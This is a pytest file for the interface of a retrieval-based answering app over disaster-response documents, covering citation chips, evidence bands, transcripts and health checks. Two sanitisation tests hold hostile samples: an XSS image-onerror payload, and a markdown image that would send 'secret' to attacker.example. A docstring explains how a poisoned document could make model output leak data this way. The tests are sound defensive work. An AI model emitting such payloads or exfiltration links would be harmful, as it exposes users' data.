"""Tests for what the interface shows, computed without a browser (features 37, 47, 53-65)."""

from __future__ import annotations

import json
from datetime import UTC, datetime
from pathlib import Path

import pytest
from pydantic import ValidationError

from citara.chunking.models import Chunk
from citara.config import Paths, RetrievalSettings, Settings, UiSettings
from citara.generation.citations import build_citations
from citara.generation.models import GeneratedAnswer
from citara.retrieval.models import RetrievedChunk
from citara.ui import health, presenters
from citara.ui.corpus import load_corpus

UI = UiSettings()


def result(chunk_id: str, content: str, score: float, page: int = 47) -> RetrievedChunk:
    chunk = Chunk(
        chunk_id=chunk_id,
        doc_id="ndrp",
        title="NDRP 2019",
        filename="ndrp.pdf",
        page_start=page,
        page_end=page,
        total_pages=110,
        year=2019,
        ordinal=0,
        content=content,
    )
    return RetrievedChunk(chunk=chunk, rerank_score=score, fusion_score=0.5)


def generated(text: str, scores: tuple[float, ...] = (0.92,), **fields: object) -> GeneratedAnswer:
    evidence = [result(f"c{i}", f"Passage {i}.", s, page=47 + i) for i, s in enumerate(scores)]
    citations = build_citations(evidence)
    for citation in citations:
        citation.used = f"[{citation.marker}]" in text
    answer = GeneratedAnswer(
        text=text, citations=citations, evidence=evidence, provider="gemini", model="m"
    )
    for name, value in fields.items():
        setattr(answer, name, value)
    return answer


# --- citation chips (feature 54) -----------------------------------------------------


def test_markers_become_chips_that_show_the_page() -> None:
    """The page is on the chip itself: a phone has no hover to reveal a tooltip."""
    rendered = presenters.render_answer_html(generated("Evacuate low-lying areas [1]."))
    assert '<span class="cite-chip" title="NDRP 2019, p. 47">1 · p. 47</span>' in rendered
    assert "[1]" not in rendered


def test_a_marker_without_evidence_is_flagged_not_dropped() -> None:
    rendered = presenters.render_answer_html(generated("Boats are pre-positioned [7]."))
    assert "cite-invalid" in rendered
    assert "7?" in rendered


def test_html_in_model_output_is_never_rendered() -> None:
    """Model output can echo a poisoned document; it must not become markup."""
    rendered = presenters.render_answer_html(
        generated('<img src=x onerror="alert(1)"> Evacuate now [1].')
    )
    assert "<img" not in rendered
    assert "&lt;img" in rendered
    assert '<span class="cite-chip"' in rendered  # the chips are still real markup


def test_markdown_images_cannot_send_requests() -> None:
    """Rendering ![](https://attacker/?q=...) would exfiltrate without a click."""
    text = "Evacuate [1]. ![status](https://attacker.example/log?q=secret)"
    rendered = presenters.render_answer_html(generated(text))
    assert "attacker.example" not in rendered
    assert "status" in rendered  # the alt text survives
    assert "attacker.example" not in presenters.safe_markdown(text)


def test_citation_titles_are_escaped_inside_the_tooltip() -> None:
    answer = generated("Claim [1].")
    answer.citations[0].citation = 'Plan "2026" <draft>'
    rendered = presenters.render_answer_html(answer)
    assert 'title="Plan &quot;2026&quot; &lt;draft&gt;"' in rendered


def test_page_ranges_read_naturally() -> None:
    answer = generated("Claim [1].")
    answer.citations[0].page_end = 49
    assert presenters.pages(answer.citations[0]) == "pp. 47-49"


# --- evidence strength (feature 56) --------------------------------------------------


@pytest.mark.parametrize(
    ("score", "band"),
    [(0.999, "High"), (0.80, "High"), (0.70, "Moderate"), (0.50, "Moderate"), (0.42, "Low")],
)
def test_evidence_bands_follow_the_best_reranker_score(score: float, band: str) -> None:
    assert presenters.evidence_band(generated("x [1].", scores=(0.1, score)), UI) == band


def test_a_refusal_has_no_evidence_band() -> None:
    assert presenters.evidence_band(GeneratedAnswer(text="no", mode="refused"), UI) is None


def test_bands_below_the_floor_are_rejected() -> None:
    """Regression: Moderate at 0.25 sat under the 0.3386 floor, so Low could never appear."""
    with pytest.raises(ValidationError, match="Low evidence band"):
        Settings(  # type: ignore[call-arg]
            _env_file=None,
            ui=UiSettings(evidence_strength_high=0.6, evidence_strength_moderate=0.25),
            retrieval=RetrievalSettings(relevance_floor=0.3386),
        )


# --- latency and notices (features 37, 62) -------------------------------------------


def test_latency_names_the_timings_and_who_answered() -> None:
    answer = generated("x [1].", retrieval_ms=3400.0, generation_ms=1500.0, failover_used=True)
    line = presenters.latency_line(answer)
    assert "Retrieval 3.4 s" in line
    assert "Generation 1.5 s" in line
    assert "Total 4.9 s" in line
    assert "m (failover)" in line


def test_latency_is_honest_about_what_did_not_happen() -> None:
    assert "cache" in presenters.latency_line(generated("x [1].", cached=True))
    refused = GeneratedAnswer(text="no", mode="refused", retrieval_ms=3100.0, reason="no_evidence")
    assert presenters.latency_line(refused).endswith("no model called")
    blocked = GeneratedAnswer(text="no", mode="blocked", reason="injection")
    assert presenters.latency_line(blocked) == "Stopped before retrieval"


@pytest.mark.parametrize(
    ("mode", "reason", "kind", "phrase"),
    [
        ("refused", "no_evidence", "refusal", "No supporting evidence"),
        ("refused", "too_long", "limit", "too long"),
        ("refused", "session_cap", "limit", "limit reached"),
        ("blocked", "injection", "blocked", "declined"),
        ("out_of_scope", "out_of_scope", "scope", "scope"),
        ("degraded", "budget_exhausted", "degraded", "allowance"),
        ("degraded", "providers_unavailable", "degraded", "Summary unavailable"),
    ],
)
def test_every_non_answer_says_why(mode: str, reason: str, kind: str, phrase: str) -> None:
    notice = presenters.notice(GeneratedAnswer(text="t", mode=mode, reason=reason))  # type: ignore[arg-type]
    assert notice is not None
    assert notice.kind == kind
    assert phrase in notice.heading


def test_a_normal_answer_has_no_notice() -> None:
    assert presenters.notice(generated("x [1].")) is None


# --- source panel and transcript (features 55, 63) -----------------------------------


def test_source_rows_keep_the_answers_numbering_and_cited_state() -> None:
    rows = presenters.source_rows(generated("Only the second [2].", scores=(0.9, 0.8)))
    assert [(row.marker, row.cited) for row in rows] == [(1, False), (2, True)]
    assert rows[1].citation == "NDRP 2019, p. 48"
    assert rows[1].score == 0.8


def test_the_transcript_is_a_self_contained_record() -> None:
    turns = [
        presenters.Turn(
            question="What should people do?",
            answer=generated("Evacuate low-lying areas [1].", retrieval_ms=100.0),
            asked_at=datetime(2026, 9, 20, 9, 5, tzinfo=UTC),
            scope="NDRP 2019",
        ),
        presenters.Turn(
            question="What is the Gwadar threshold?",
            answer=GeneratedAnswer(
                text="I could not find this.", mode="refused", reason="no_evidence"
            ),
            asked_at=datetime(2026, 9, 20, 9, 6, tzinfo=UTC),
        ),
    ]
    text = presenters.transcript(
        turns, "Not an official NDMA system.", UI, datetime(2026, 9, 20, 9, 7, tzinfo=UTC)
    )

    assert "Not an official NDMA system." in text
    assert "Q1. What should people do?" in text
    assert "Evacuate low-lying areas [1]." in text
    assert "[1] NDRP 2019, p. 47 (cited)" in text
    assert "Searched: NDRP 2019" in text
    assert "Evidence strength: High" in text
    assert "A2. [No supporting evidence in the indexed documents]" in text
    assert "Generated 2026-09-20 09:07 UTC" in text


def test_a_degraded_turn_keeps_its_passages_in_the_transcript() -> None:
    answer = generated("", scores=(0.9,), mode="degraded", reason="providers_unavailable")
    turn = presenters.Turn(question="q", answer=answer, asked_at=datetime.now(UTC))
    text = presenters.transcript([turn], "d", UI, datetime.now(UTC))
    assert "No summary was generated" in text
    assert "Passage 0." in text


# --- corpus boundary (feature 57) ----------------------------------------------------


def write_manifests(
    data: Path, collected: list[dict[str, object]], indexed: dict[str, int]
) -> Settings:
    data.mkdir(parents=True, exist_ok=True)
    (data / "corpus_manifest.json").write_text(
        json.dumps({"documents": collected}), encoding="utf-8"
    )
    (data / "index_manifest.json").write_text(
        json.dumps(
            {
                "chunk_count": sum(indexed.values()),
                "documents": [{"doc_id": d, "chunks": n} for d, n in indexed.items()],
            }
        ),
        encoding="utf-8",
    )
    return Settings(_env_file=None, paths=Paths(data_dir=data))  # type: ignore[call-arg]


def doc(
    doc_id: str, pages: int, indexed: int, year: int = 2026, **extra: object
) -> dict[str, object]:
    return {
        "doc_id": doc_id,
        "title": doc_id.upper(),
        "year": year,
        "total_pages": pages,
        "pages_indexed": indexed,
        "pages_image_only": pages - indexed,
        **extra,
    }


def test_the_boundary_counts_searchable_pages_not_pdf_pages(tmp_path: Path) -> None:
    """Regression: NDRP 2019 has 110 pages, 61 of them scanned images no answer can use."""
    settings = write_manifests(
        tmp_path / "data",
        [doc("ndrp", 110, 49, year=2019), doc("pdna", 184, 184, year=2022)],
        {"ndrp": 50, "pdna": 575},
    )
    corpus = load_corpus(settings)

    assert corpus.searchable_pages == 49 + 184
    assert corpus.total_pages == 110 + 184
    ndrp = next(d for d in corpus.documents if d.doc_id == "ndrp")
    assert ndrp.note == "61 scanned pages not searchable"
    assert corpus.years == [2022, 2019]


def test_documents_missing_from_the_index_are_listed_as_unsearchable(tmp_path: Path) -> None:
    settings = write_manifests(
        tmp_path / "data",
        [doc("scanned", 40, 0, needs_ocr=True), doc("plan", 10, 10)],
        {"plan": 12},
    )
    corpus = load_corpus(settings)

    assert [d.doc_id for d in corpus.unsearchable] == ["scanned"]
    assert "OCR" in corpus.unsearchable[0].note
    assert corpus.searchable_pages == 10


def test_missing_manifests_give_an_empty_boundary_not_a_crash(tmp_path: Path) -> None:
    settings = Settings(_env_file=None, paths=Paths(data_dir=tmp_path / "none"))  # type: ignore[call-arg]
    assert load_corpus(settings).documents == []


# --- error states (feature 65) -------------------------------------------------------


def built_index(tmp_path: Path, chunk_count: int = 10, documents: int = 1) -> Settings:
    data = tmp_path / "data"
    (data / "chroma").mkdir(parents=True)
    (data / "bm25").mkdir()
    (data / "bm25" / "index.json").write_text("{}", encoding="utf-8")
    (data / "chunks.jsonl").write_text("", encoding="utf-8")
    (data / "index_manifest.json").write_text(
        json.dumps({"chunk_count": chunk_count, "documents": [{}] * documents}), encoding="utf-8"
    )
    return Settings(_env_file=None, paths=Paths(data_dir=data))  # type: ignore[call-arg]


def test_a_missing_index_names_what_is_missing_and_how_to_build_it(tmp_path: Path) -> None:
    settings = Settings(_env_file=None, paths=Paths(data_dir=tmp_path / "empty"))  # type: ignore[call-arg]
    problems = health.check(settings)

    assert len(problems) == 1
    assert problems[0].blocking
    assert problems[0].title == "The document index is missing"
    assert "vector index" in problems[0].detail
    assert "python -m citara.indexing" in problems[0].detail


def test_an_empty_index_is_its_own_error(tmp_path: Path) -> None:
    problems = health.check(built_index(tmp_path, chunk_count=0, documents=0))
    assert problems[0].title == "The document index is empty"
    assert problems[0].blocking


def test_an_unreadable_manifest_is_reported(tmp_path: Path) -> None:
    settings = built_index(tmp_path)
    settings.paths.resolved(settings.paths.index_manifest_path).write_text("{not json", "utf-8")
    assert health.check(settings)[0].title == "The document index is unreadable"


def test_no_model_key_warns_that_answers_will_be_passages_only(tmp_path: Path) -> None:
    problems = health.check(built_index(tmp_path))
    assert [p.severity for p in problems] == ["warning"]
    assert "GOOGLE_API_KEY" in problems[0].detail
    assert not problems[0].blocking


def test_a_missing_failover_key_is_noted(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("GOOGLE_API_KEY", "key")
    problems = health.check(built_index(tmp_path))
    assert [(p.severity, p.title) for p in problems] == [("info", "Failover is not available")]


def test_a_fully_configured_deployment_reports_nothing(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("GOOGLE_API_KEY", "key")
    monkeypatch.setenv("GROQ_API_KEY", "key")
    assert health.check(built_index(tmp_path)) == []


# --- cold start (feature 64) ---------------------------------------------------------


def test_the_interface_can_draw_before_the_models_load() -> None:
    """Regression: importing the UI pulled in torch, so a cold start showed a blank page.

    Package re-exports and a module-level Answerer import made the heavy stack load before
    Streamlit drew anything - the header, the disclaimer and the loading state included.
    Checked in a fresh interpreter, because this test process has long since imported them.
    """
    import subprocess
    import sys

    probe = (
        "import sys, citara.ui.app; "
        "print(','.join(m for m in ('torch', 'sentence_transformers', 'chromadb', "
        "'transformers', 'langchain_google_genai', 'langchain_groq') if m in sys.modules))"
    )
    loaded = subprocess.run(
        [sys.executable, "-c", probe], capture_output=True, text=True, check=True, timeout=120
    ).stdout.strip()
    assert loaded == ""


def test_package_exports_still_resolve_on_demand() -> None:
    from citara.chunking import Chunk
    from citara.generation import Answerer, GeneratedAnswer
    from citara.retrieval import HybridRetriever, RetrievedChunk

    assert Answerer.__name__ == "Answerer"
    assert {Chunk.__name__, GeneratedAnswer.__name__, HybridRetriever.__name__} == {
        "Chunk",
        "GeneratedAnswer",
        "HybridRetriever",
    }
    assert RetrievedChunk.__module__ == "citara.retrieval.models"
    with pytest.raises(ImportError):  # from-imports report a missing name this way
        from citara.generation import NotAThing  # type: ignore[attr-defined]  # noqa: F401


def test_a_full_stop_stays_with_its_chip() -> None:
    """Seen at phone width: a wrapped chip stranded its full stop alone on the next line."""
    rendered = presenters.render_answer_html(generated("Limit outdoor work [1]. Rest often [1]"))
    assert '<span class="cite-tail"><span class="cite-chip"' in rendered
    assert "</span>.</span>" in rendered
    assert rendered.endswith("1 · p. 47</span>")  # no punctuation, no wrapper
